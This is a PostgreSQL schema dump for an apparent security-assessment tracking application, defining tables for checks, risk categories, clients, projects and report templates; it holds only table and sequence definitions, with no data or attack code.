--
-- PostgreSQL database dump
--

-- Dumped from database version 8.4.13
-- Dumped by pg_dump version 9.1.3
-- Started on 2012-11-30 13:13:25 MSK

SET statement_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = off;
SET check_function_bodies = false;
SET client_min_messages = warning;
SET escape_string_warning = off;

SET search_path = public, pg_catalog;

--
-- TOC entry 496 (class 1247 OID 21583)
-- Dependencies: 6
-- Name: check_rating; Type: TYPE; Schema: public; Owner: postgres
--

CREATE TYPE check_rating AS ENUM (
    'hidden',
    'info',
    'low_risk',
    'med_risk',
    'high_risk'
);


ALTER TYPE public.check_rating OWNER TO postgres;

--
-- TOC entry 499 (class 1247 OID 21590)
-- Dependencies: 6
-- Name: check_status; Type: TYPE; Schema: public; Owner: postgres
--

CREATE TYPE check_status AS ENUM (
    'open',
    'in_progress',
    'stop',
    'finished'
);


ALTER TYPE public.check_status OWNER TO postgres;

--
-- TOC entry 502 (class 1247 OID 21596)
-- Dependencies: 6
-- Name: project_status; Type: TYPE; Schema: public; Owner: gtta
--

CREATE TYPE project_status AS ENUM (
    'open',
    'in_progress',
    'finished'
);


ALTER TYPE public.project_status OWNER TO gtta;

--
-- TOC entry 505 (class 1247 OID 21601)
-- Dependencies: 6
-- Name: user_role; Type: TYPE; Schema: public; Owner: postgres
--

CREATE TYPE user_role AS ENUM (
    'admin',
    'user',
    'client'
);


ALTER TYPE public.user_role OWNER TO postgres;

--
-- TOC entry 658 (class 1247 OID 26942)
-- Dependencies: 6
-- Name: vuln_status; Type: TYPE; Schema: public; Owner: gtta
--

CREATE TYPE vuln_status AS ENUM (
    'open',
    'resolved'
);


ALTER TYPE public.vuln_status OWNER TO gtta;

SET default_tablespace = '';

SET default_with_oids = false;

--
-- TOC entry 140 (class 1259 OID 21605)
-- Dependencies: 6
-- Name: check_categories; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_categories (
    id bigint NOT NULL,
    name character varying(1000) NOT NULL
);


ALTER TABLE public.check_categories OWNER TO gtta;

--
-- TOC entry 141 (class 1259 OID 21611)
-- Dependencies: 140 6
-- Name: check_categories_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE check_categories_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.check_categories_id_seq OWNER TO gtta;

--
-- TOC entry 2261 (class 0 OID 0)
-- Dependencies: 141
-- Name: check_categories_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE check_categories_id_seq OWNED BY check_categories.id;


--
-- TOC entry 2262 (class 0 OID 0)
-- Dependencies: 141
-- Name: check_categories_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('check_categories_id_seq', 11, true);


--
-- TOC entry 142 (class 1259 OID 21613)
-- Dependencies: 6
-- Name: check_categories_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_categories_l10n (
    check_category_id bigint NOT NULL,
    language_id bigint NOT NULL,
    name character varying(1000)
);


ALTER TABLE public.check_categories_l10n OWNER TO gtta;

--
-- TOC entry 143 (class 1259 OID 21619)
-- Dependencies: 6
-- Name: check_controls; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_controls (
    id bigint NOT NULL,
    check_category_id bigint NOT NULL,
    name character varying(1000) NOT NULL
);


ALTER TABLE public.check_controls OWNER TO gtta;

--
-- TOC entry 144 (class 1259 OID 21625)
-- Dependencies: 6 143
-- Name: check_controls_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE check_controls_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.check_controls_id_seq OWNER TO gtta;

--
-- TOC entry 2263 (class 0 OID 0)
-- Dependencies: 144
-- Name: check_controls_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE check_controls_id_seq OWNED BY check_controls.id;


--
-- TOC entry 2264 (class 0 OID 0)
-- Dependencies: 144
-- Name: check_controls_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('check_controls_id_seq', 12, true);


--
-- TOC entry 145 (class 1259 OID 21627)
-- Dependencies: 6
-- Name: check_controls_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_controls_l10n (
    check_control_id bigint NOT NULL,
    language_id bigint NOT NULL,
    name character varying(1000)
);


ALTER TABLE public.check_controls_l10n OWNER TO gtta;

--
-- TOC entry 146 (class 1259 OID 21633)
-- Dependencies: 2020 6
-- Name: check_inputs; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_inputs (
    id bigint NOT NULL,
    check_id bigint NOT NULL,
    name character varying(1000) NOT NULL,
    description character varying,
    sort_order integer DEFAULT 0 NOT NULL,
    value character varying
);


ALTER TABLE public.check_inputs OWNER TO gtta;

--
-- TOC entry 147 (class 1259 OID 21640)
-- Dependencies: 146 6
-- Name: check_inputs_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE check_inputs_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.check_inputs_id_seq OWNER TO gtta;

--
-- TOC entry 2265 (class 0 OID 0)
-- Dependencies: 147
-- Name: check_inputs_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE check_inputs_id_seq OWNED BY check_inputs.id;


--
-- TOC entry 2266 (class 0 OID 0)
-- Dependencies: 147
-- Name: check_inputs_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('check_inputs_id_seq', 42, true);


--
-- TOC entry 148 (class 1259 OID 21642)
-- Dependencies: 6
-- Name: check_inputs_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_inputs_l10n (
    check_input_id bigint NOT NULL,
    language_id bigint NOT NULL,
    name character varying(1000),
    description character varying,
    value character varying
);


ALTER TABLE public.check_inputs_l10n OWNER TO gtta;

--
-- TOC entry 149 (class 1259 OID 21648)
-- Dependencies: 2022 6
-- Name: check_results; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_results (
    id bigint NOT NULL,
    check_id bigint NOT NULL,
    result character varying NOT NULL,
    sort_order integer DEFAULT 0 NOT NULL,
    title character varying(1000) NOT NULL
);


ALTER TABLE public.check_results OWNER TO gtta;

--
-- TOC entry 150 (class 1259 OID 21655)
-- Dependencies: 6 149
-- Name: check_results_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE check_results_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.check_results_id_seq OWNER TO gtta;

--
-- TOC entry 2267 (class 0 OID 0)
-- Dependencies: 150
-- Name: check_results_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE check_results_id_seq OWNED BY check_results.id;


--
-- TOC entry 2268 (class 0 OID 0)
-- Dependencies: 150
-- Name: check_results_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('check_results_id_seq', 5, true);


--
-- TOC entry 151 (class 1259 OID 21657)
-- Dependencies: 6
-- Name: check_results_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_results_l10n (
    check_result_id bigint NOT NULL,
    language_id bigint NOT NULL,
    result character varying,
    title character varying(1000)
);


ALTER TABLE public.check_results_l10n OWNER TO gtta;

--
-- TOC entry 152 (class 1259 OID 21663)
-- Dependencies: 2024 6
-- Name: check_solutions; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_solutions (
    id bigint NOT NULL,
    check_id bigint NOT NULL,
    solution character varying NOT NULL,
    sort_order integer DEFAULT 0 NOT NULL,
    title character varying(1000) NOT NULL
);


ALTER TABLE public.check_solutions OWNER TO gtta;

--
-- TOC entry 153 (class 1259 OID 21670)
-- Dependencies: 152 6
-- Name: check_solutions_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE check_solutions_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.check_solutions_id_seq OWNER TO gtta;

--
-- TOC entry 2269 (class 0 OID 0)
-- Dependencies: 153
-- Name: check_solutions_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE check_solutions_id_seq OWNED BY check_solutions.id;


--
-- TOC entry 2270 (class 0 OID 0)
-- Dependencies: 153
-- Name: check_solutions_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('check_solutions_id_seq', 7, true);


--
-- TOC entry 154 (class 1259 OID 21672)
-- Dependencies: 6
-- Name: check_solutions_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE check_solutions_l10n (
    check_solution_id bigint NOT NULL,
    language_id bigint NOT NULL,
    solution character varying,
    title character varying(1000)
);


ALTER TABLE public.check_solutions_l10n OWNER TO gtta;

--
-- TOC entry 155 (class 1259 OID 21678)
-- Dependencies: 2026 6
-- Name: checks; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE checks (
    id bigint NOT NULL,
    check_control_id bigint NOT NULL,
    name character varying(1000) NOT NULL,
    background_info character varying,
    hints character varying,
    advanced boolean NOT NULL,
    automated boolean NOT NULL,
    script character varying(1000),
    multiple_solutions boolean NOT NULL,
    protocol character varying(1000),
    port integer,
    question character varying,
    reference_id bigint NOT NULL,
    reference_code character varying(1000),
    reference_url character varying(1000),
    effort integer DEFAULT 0 NOT NULL
);


ALTER TABLE public.checks OWNER TO gtta;

--
-- TOC entry 156 (class 1259 OID 21685)
-- Dependencies: 155 6
-- Name: checks_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE checks_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.checks_id_seq OWNER TO gtta;

--
-- TOC entry 2271 (class 0 OID 0)
-- Dependencies: 156
-- Name: checks_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE checks_id_seq OWNED BY checks.id;


--
-- TOC entry 2272 (class 0 OID 0)
-- Dependencies: 156
-- Name: checks_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('checks_id_seq', 48, true);


--
-- TOC entry 157 (class 1259 OID 21687)
-- Dependencies: 6
-- Name: checks_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE checks_l10n (
    check_id bigint NOT NULL,
    language_id bigint NOT NULL,
    name character varying(1000),
    background_info character varying,
    hints character varying,
    reference character varying,
    question character varying
);


ALTER TABLE public.checks_l10n OWNER TO gtta;

--
-- TOC entry 158 (class 1259 OID 21693)
-- Dependencies: 6
-- Name: clients; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE clients (
    id bigint NOT NULL,
    name character varying(1000) NOT NULL,
    country character varying(1000),
    state character varying(1000),
    city character varying(1000),
    address character varying(1000),
    postcode character varying(1000),
    website character varying(1000),
    contact_name character varying(1000),
    contact_phone character varying(1000),
    contact_email character varying(1000),
    contact_fax character varying(1000),
    logo_path character varying(1000),
    logo_type character varying(1000)
);


ALTER TABLE public.clients OWNER TO gtta;

--
-- TOC entry 159 (class 1259 OID 21699)
-- Dependencies: 158 6
-- Name: clients_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE clients_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.clients_id_seq OWNER TO gtta;

--
-- TOC entry 2273 (class 0 OID 0)
-- Dependencies: 159
-- Name: clients_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE clients_id_seq OWNED BY clients.id;


--
-- TOC entry 2274 (class 0 OID 0)
-- Dependencies: 159
-- Name: clients_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('clients_id_seq', 4, true);


--
-- TOC entry 160 (class 1259 OID 21701)
-- Dependencies: 2029 2030 6
-- Name: emails; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE emails (
    id bigint NOT NULL,
    user_id bigint NOT NULL,
    subject character varying(1000) NOT NULL,
    content character varying NOT NULL,
    attempts integer DEFAULT 0 NOT NULL,
    sent boolean DEFAULT false NOT NULL
);


ALTER TABLE public.emails OWNER TO gtta;

--
-- TOC entry 161 (class 1259 OID 21709)
-- Dependencies: 160 6
-- Name: emails_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE emails_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.emails_id_seq OWNER TO gtta;

--
-- TOC entry 2275 (class 0 OID 0)
-- Dependencies: 161
-- Name: emails_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE emails_id_seq OWNED BY emails.id;


--
-- TOC entry 2276 (class 0 OID 0)
-- Dependencies: 161
-- Name: emails_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('emails_id_seq', 8, true);


--
-- TOC entry 162 (class 1259 OID 21711)
-- Dependencies: 6
-- Name: languages; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE languages (
    id bigint NOT NULL,
    name character varying(1000) NOT NULL,
    code character(2) NOT NULL,
    "default" boolean NOT NULL
);


ALTER TABLE public.languages OWNER TO gtta;

--
-- TOC entry 163 (class 1259 OID 21717)
-- Dependencies: 6 162
-- Name: languages_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE languages_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.languages_id_seq OWNER TO gtta;

--
-- TOC entry 2277 (class 0 OID 0)
-- Dependencies: 163
-- Name: languages_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE languages_id_seq OWNED BY languages.id;


--
-- TOC entry 2278 (class 0 OID 0)
-- Dependencies: 163
-- Name: languages_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('languages_id_seq', 3, true);


--
-- TOC entry 164 (class 1259 OID 21719)
-- Dependencies: 6
-- Name: project_details; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE project_details (
    id bigint NOT NULL,
    project_id bigint NOT NULL,
    subject character varying(1000) NOT NULL,
    content character varying
);


ALTER TABLE public.project_details OWNER TO gtta;

--
-- TOC entry 165 (class 1259 OID 21725)
-- Dependencies: 6 164
-- Name: project_details_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE project_details_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.project_details_id_seq OWNER TO gtta;

--
-- TOC entry 2279 (class 0 OID 0)
-- Dependencies: 165
-- Name: project_details_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE project_details_id_seq OWNED BY project_details.id;


--
-- TOC entry 2280 (class 0 OID 0)
-- Dependencies: 165
-- Name: project_details_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('project_details_id_seq', 3, true);


--
-- TOC entry 187 (class 1259 OID 26344)
-- Dependencies: 2052 6
-- Name: project_users; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE project_users (
    project_id bigint NOT NULL,
    user_id bigint NOT NULL,
    admin boolean DEFAULT false NOT NULL
);


ALTER TABLE public.project_users OWNER TO gtta;

--
-- TOC entry 166 (class 1259 OID 21727)
-- Dependencies: 2034 6 502
-- Name: projects; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE projects (
    id bigint NOT NULL,
    client_id bigint NOT NULL,
    year character(4) NOT NULL,
    deadline date NOT NULL,
    name character varying(1000) NOT NULL,
    status project_status DEFAULT 'open'::project_status NOT NULL,
    vuln_overdue date
);


ALTER TABLE public.projects OWNER TO gtta;

--
-- TOC entry 167 (class 1259 OID 21734)
-- Dependencies: 6 166
-- Name: projects_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE projects_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.projects_id_seq OWNER TO gtta;

--
-- TOC entry 2281 (class 0 OID 0)
-- Dependencies: 167
-- Name: projects_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE projects_id_seq OWNED BY projects.id;


--
-- TOC entry 2282 (class 0 OID 0)
-- Dependencies: 167
-- Name: projects_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('projects_id_seq', 12, true);


--
-- TOC entry 168 (class 1259 OID 21736)
-- Dependencies: 6
-- Name: references; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE "references" (
    id bigint NOT NULL,
    name character varying(1000) NOT NULL,
    url character varying(1000)
);


ALTER TABLE public."references" OWNER TO gtta;

--
-- TOC entry 169 (class 1259 OID 21742)
-- Dependencies: 6 168
-- Name: references_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE references_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.references_id_seq OWNER TO gtta;

--
-- TOC entry 2283 (class 0 OID 0)
-- Dependencies: 169
-- Name: references_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE references_id_seq OWNED BY "references".id;


--
-- TOC entry 2284 (class 0 OID 0)
-- Dependencies: 169
-- Name: references_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('references_id_seq', 2, true);


--
-- TOC entry 199 (class 1259 OID 28055)
-- Dependencies: 2060 6
-- Name: report_template_sections; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE report_template_sections (
    id bigint NOT NULL,
    report_template_id bigint NOT NULL,
    check_category_id bigint NOT NULL,
    intro character varying,
    sort_order integer DEFAULT 0 NOT NULL,
    title character varying(1000)
);


ALTER TABLE public.report_template_sections OWNER TO gtta;

--
-- TOC entry 198 (class 1259 OID 28053)
-- Dependencies: 6 199
-- Name: report_template_sections_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE report_template_sections_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.report_template_sections_id_seq OWNER TO gtta;

--
-- TOC entry 2285 (class 0 OID 0)
-- Dependencies: 198
-- Name: report_template_sections_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE report_template_sections_id_seq OWNED BY report_template_sections.id;


--
-- TOC entry 2286 (class 0 OID 0)
-- Dependencies: 198
-- Name: report_template_sections_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('report_template_sections_id_seq', 3, true);


--
-- TOC entry 200 (class 1259 OID 28075)
-- Dependencies: 6
-- Name: report_template_sections_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE report_template_sections_l10n (
    report_template_section_id bigint NOT NULL,
    language_id bigint NOT NULL,
    intro character varying,
    title character varying(1000)
);


ALTER TABLE public.report_template_sections_l10n OWNER TO gtta;

--
-- TOC entry 196 (class 1259 OID 27336)
-- Dependencies: 2057 2058 6
-- Name: report_template_summary; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE report_template_summary (
    id bigint NOT NULL,
    summary character varying,
    rating_from numeric(3,2) DEFAULT 0.00 NOT NULL,
    rating_to numeric(3,2) DEFAULT 0.00 NOT NULL,
    report_template_id bigint NOT NULL,
    title character varying(1000)
);


ALTER TABLE public.report_template_summary OWNER TO gtta;

--
-- TOC entry 195 (class 1259 OID 27334)
-- Dependencies: 196 6
-- Name: report_template_summary_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE report_template_summary_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.report_template_summary_id_seq OWNER TO gtta;

--
-- TOC entry 2287 (class 0 OID 0)
-- Dependencies: 195
-- Name: report_template_summary_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE report_template_summary_id_seq OWNED BY report_template_summary.id;


--
-- TOC entry 2288 (class 0 OID 0)
-- Dependencies: 195
-- Name: report_template_summary_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('report_template_summary_id_seq', 4, true);


--
-- TOC entry 197 (class 1259 OID 27347)
-- Dependencies: 6
-- Name: report_template_summary_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE report_template_summary_l10n (
    report_template_summary_id bigint NOT NULL,
    language_id bigint NOT NULL,
    summary character varying,
    title character varying(1000)
);


ALTER TABLE public.report_template_summary_l10n OWNER TO gtta;

--
-- TOC entry 193 (class 1259 OID 27306)
-- Dependencies: 6
-- Name: report_templates; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE report_templates (
    id bigint NOT NULL,
    name character varying(1000),
    header_image_path character varying(1000),
    header_image_type character varying(1000),
    intro character varying,
    appendix character varying,
    vulns_intro character varying,
    info_checks_intro character varying,
    security_level_intro character varying,
    vuln_distribution_intro character varying
);


ALTER TABLE public.report_templates OWNER TO gtta;

--
-- TOC entry 192 (class 1259 OID 27304)
-- Dependencies: 6 193
-- Name: report_templates_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE report_templates_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.report_templates_id_seq OWNER TO gtta;

--
-- TOC entry 2289 (class 0 OID 0)
-- Dependencies: 192
-- Name: report_templates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE report_templates_id_seq OWNED BY report_templates.id;


--
-- TOC entry 2290 (class 0 OID 0)
-- Dependencies: 192
-- Name: report_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('report_templates_id_seq', 3, true);


--
-- TOC entry 194 (class 1259 OID 27315)
-- Dependencies: 6
-- Name: report_templates_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE report_templates_l10n (
    report_template_id bigint NOT NULL,
    language_id bigint NOT NULL,
    name character varying(1000),
    intro character varying,
    appendix character varying,
    vulns_intro character varying,
    info_checks_intro character varying,
    security_level_intro character varying,
    vuln_distribution_intro character varying
);


ALTER TABLE public.report_templates_l10n OWNER TO gtta;

--
-- TOC entry 183 (class 1259 OID 22073)
-- Dependencies: 6
-- Name: risk_categories; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE risk_categories (
    id bigint NOT NULL,
    name character varying(1000),
    risk_template_id bigint NOT NULL
);


ALTER TABLE public.risk_categories OWNER TO gtta;

--
-- TOC entry 182 (class 1259 OID 22071)
-- Dependencies: 6 183
-- Name: risk_categories_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE risk_categories_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.risk_categories_id_seq OWNER TO gtta;

--
-- TOC entry 2291 (class 0 OID 0)
-- Dependencies: 182
-- Name: risk_categories_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE risk_categories_id_seq OWNED BY risk_categories.id;


--
-- TOC entry 2292 (class 0 OID 0)
-- Dependencies: 182
-- Name: risk_categories_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('risk_categories_id_seq', 19, true);


--
-- TOC entry 184 (class 1259 OID 22082)
-- Dependencies: 6
-- Name: risk_categories_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE risk_categories_l10n (
    risk_category_id bigint NOT NULL,
    language_id bigint NOT NULL,
    name character varying(1000)
);


ALTER TABLE public.risk_categories_l10n OWNER TO gtta;

--
-- TOC entry 185 (class 1259 OID 24899)
-- Dependencies: 2050 2051 6
-- Name: risk_category_checks; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE risk_category_checks (
    risk_category_id bigint NOT NULL,
    check_id bigint NOT NULL,
    damage integer DEFAULT 0 NOT NULL,
    likelihood integer DEFAULT 0 NOT NULL
);


ALTER TABLE public.risk_category_checks OWNER TO gtta;

--
-- TOC entry 189 (class 1259 OID 26361)
-- Dependencies: 6
-- Name: risk_templates; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE risk_templates (
    id bigint NOT NULL,
    name character varying(1000)
);


ALTER TABLE public.risk_templates OWNER TO gtta;

--
-- TOC entry 188 (class 1259 OID 26359)
-- Dependencies: 6 189
-- Name: risk_templates_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE risk_templates_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.risk_templates_id_seq OWNER TO gtta;

--
-- TOC entry 2293 (class 0 OID 0)
-- Dependencies: 188
-- Name: risk_templates_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE risk_templates_id_seq OWNED BY risk_templates.id;


--
-- TOC entry 2294 (class 0 OID 0)
-- Dependencies: 188
-- Name: risk_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('risk_templates_id_seq', 5, true);


--
-- TOC entry 190 (class 1259 OID 26370)
-- Dependencies: 6
-- Name: risk_templates_l10n; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE risk_templates_l10n (
    risk_template_id bigint NOT NULL,
    language_id bigint NOT NULL,
    name character varying(1000)
);


ALTER TABLE public.risk_templates_l10n OWNER TO gtta;

--
-- TOC entry 186 (class 1259 OID 26336)
-- Dependencies: 6
-- Name: sessions; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE sessions (
    id character(32) NOT NULL,
    expire integer,
    data text
);


ALTER TABLE public.sessions OWNER TO gtta;

--
-- TOC entry 170 (class 1259 OID 21744)
-- Dependencies: 6
-- Name: system; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE system (
    id bigint NOT NULL,
    backup timestamp without time zone
);


ALTER TABLE public.system OWNER TO gtta;

--
-- TOC entry 171 (class 1259 OID 21747)
-- Dependencies: 6 170
-- Name: system_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE system_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.system_id_seq OWNER TO gtta;

--
-- TOC entry 2295 (class 0 OID 0)
-- Dependencies: 171
-- Name: system_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE system_id_seq OWNED BY system.id;


--
-- TOC entry 2296 (class 0 OID 0)
-- Dependencies: 171
-- Name: system_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('system_id_seq', 2, true);


--
-- TOC entry 172 (class 1259 OID 21749)
-- Dependencies: 2038 6
-- Name: target_check_attachments; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE target_check_attachments (
    target_id bigint NOT NULL,
    check_id bigint NOT NULL,
    name character varying(1000) NOT NULL,
    type character varying(1000) NOT NULL,
    path character varying(1000) NOT NULL,
    size bigint DEFAULT 0 NOT NULL
);


ALTER TABLE public.target_check_attachments OWNER TO gtta;

--
-- TOC entry 173 (class 1259 OID 21756)
-- Dependencies: 2039 2040 2041 2042 2043 2044 6
-- Name: target_check_categories; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE target_check_categories (
    target_id bigint NOT NULL,
    check_category_id bigint NOT NULL,
    advanced boolean NOT NULL,
    check_count bigint DEFAULT 0 NOT NULL,
    finished_count bigint DEFAULT 0 NOT NULL,
    low_risk_count bigint DEFAULT 0 NOT NULL,
    med_risk_count bigint DEFAULT 0 NOT NULL,
    high_risk_count bigint DEFAULT 0 NOT NULL,
    info_count bigint DEFAULT 0 NOT NULL
);


ALTER TABLE public.target_check_categories OWNER TO gtta;

--
-- TOC entry 174 (class 1259 OID 21764)
-- Dependencies: 6
-- Name: target_check_inputs; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

